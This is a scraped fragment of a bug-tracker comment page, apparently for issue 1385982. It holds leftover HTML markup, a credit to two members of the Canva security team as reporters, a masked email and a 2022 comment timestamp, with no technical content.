class="line"><!---->Reporter credit: Rhys Elsmore and Zac Sims of the Canva security team<!----></span><mr-comment-content></mr-comment-content>

          Comment 2<a class="comment-link" href="?id=1385982#c2">Comment 2<!----></a>

          
        by
        
      <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
      schedule<i id="availability-icon" class="material-icons inline-icon ${user.last_visit_timestamp ? '': 'inline-icon-unseen'}" title="undefined" hidden="">schedule</i>

      zs...@canva.com<span id="user-text" hidden=""><!---->zs...@canva.com<!----></span>

        <div>
          <a class="comment-link" href="?id=1385982#c2">Comment 2<!----></a>

          
        by
        <mr-user-link></mr-user-link>
        on
        <chops-timestamp title="Sun, Nov 20, 2022, 5:38 PM EST"></chops-timestamp>
